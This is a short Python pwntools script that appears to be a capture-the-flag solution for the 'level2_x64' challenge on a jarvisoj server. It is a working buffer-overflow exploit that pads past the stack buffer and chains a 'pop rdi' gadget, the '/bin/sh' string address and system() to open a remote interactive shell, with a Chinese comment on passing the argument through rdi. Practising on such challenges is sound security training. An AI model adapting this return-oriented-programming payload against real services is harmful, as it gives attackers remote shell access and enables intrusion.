from pwn import *

r = remote('pwn2.jarvisoj.com', 9882)
e = ELF('./level2_x64')
sys_addr = e.symbols['system']
bin_addr = e.search(b"/bin/sh").__next__()
pop_rdi = 0x4006b3

payload = b'a' * 0x80 + b'b' * 0x8 + p64(pop_rdi) + p64(bin_addr) + p64(sys_addr)  # 利用rdi寄存器给system传参
r.recvuntil('Input:')
r.sendline(payload)

r.interactive()
